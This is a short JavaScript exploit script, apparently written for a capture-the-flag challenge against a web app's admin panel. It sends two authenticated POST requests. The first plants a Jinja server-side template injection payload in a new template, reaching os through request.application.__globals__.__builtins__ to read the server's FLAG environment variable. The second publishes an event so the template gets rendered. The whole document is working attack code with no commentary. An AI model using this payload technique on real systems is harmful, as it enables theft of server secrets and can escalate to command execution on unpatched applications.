console.log("Started xploit")
fetch("/admin/templates/create", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded",
    "pragma": "no-cache",
    "sec-ch-ua": "\"Brave\";v=\"147\", \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"147\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "sec-gpc": "1",
    "upgrade-insecure-requests": "1"
  },
  "body": "name=NewWeird&html_content=%3Ch1%3E%7B%7B+request.application.__globals__.__builtins__.__import__%28%27os%27%29.environ.get%28%27FLAG%27%29+%7D%7D%3C%2Fh1%3E&is_default=on",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
fetch("/admin/events/create", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "no-cache",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryB5p7vggf3FBPQsJG",
    "pragma": "no-cache",
    "sec-ch-ua": "\"Brave\";v=\"147\", \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"147\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "sec-gpc": "1",
    "upgrade-insecure-requests": "1"
  },
  "body": "------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\ntest\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"date\"\r\n\r\n2025-12-12\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"time\"\r\n\r\n12:12\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\naaa\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"location\"\r\n\r\nPrague\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"ticket_price\"\r\n\r\n1\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"total_tickets\"\r\n\r\n100\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"image\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"template_id\"\r\n\r\n\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG\r\nContent-Disposition: form-data; name=\"is_published\"\r\n\r\non\r\n------WebKitFormBoundaryB5p7vggf3FBPQsJG--\r\n",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
console.log("Done")
